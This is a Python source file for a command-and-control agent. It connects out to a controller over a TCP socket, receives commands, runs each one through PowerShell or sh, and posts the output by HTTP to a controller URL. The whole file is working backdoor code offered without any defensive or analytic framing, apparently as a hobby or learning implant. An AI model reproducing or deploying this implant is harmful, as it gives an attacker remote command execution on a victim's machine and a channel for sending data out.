import socket
import requests
import scapy
import threading
import subprocess
import json
import base64
OS='Windows'
shell_encoding=''
shell_path=''
if OS == 'Windows':
    shell_encoding = 'cp850' #powershell i windows använder cp850 om man är svensk
    shell_path = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'

else:
    shell_encoding= 'UTF-8' 
    shell_path='/usr/bin/sh'
    
def send_output(url,string,ip): 
    """function uses request to send data to the url with the ip attached to it """
    """send output over http"""
    data={ip:str(string)}
    print(url)
    requests.post(url,json=json.dumps(data))                                 

def sub_process(cmd_to_run, url, ip):
    output = ""
    print("subprocess", cmd_to_run)
    try:
        # Run the command
        output = subprocess.run(
            [shell_path, '-Command', cmd_to_run], text=True, capture_output=True, encoding=shell_encoding
        )
        print("output stdout:", output.stdout)
        cleaned_output = output.stdout.strip().replace('\\r\\n', '\n') if output.stdout else "No output"
    except OSError:
        cleaned_output = "Command was not found"
    # Send the output to the given URL
    send_output(url, cleaned_output, ip)

def connect_sock(ip, port, url):
    """Connects to target IP and port to receive commands to run."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to:", ip, port)
    
    try:
        server.connect((ip, port))
        while True:
            length_bytes = server.recv(4)
            if not length_bytes:
                break  # Connection closed
            
            length = int.from_bytes(length_bytes, "big")
            whole_message = ""
            while length > 0:
                chunk = server.recv(1024).decode()
                length -= len(chunk)
                whole_message += chunk
            
            print("Received command:", whole_message)
            # Start a new thread to process the command
            threading.Thread(target=sub_process, args=(whole_message, url, ip)).start()
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        server.close()
    
def c2_command_start(ip='127.0.0.1',url='http://127.0.0.1:8000'):
    port = 5555
    print("start c2 command")
    socket_connection = threading.Thread(target=connect_sock,args=(ip,port,url))
    socket_connection.start()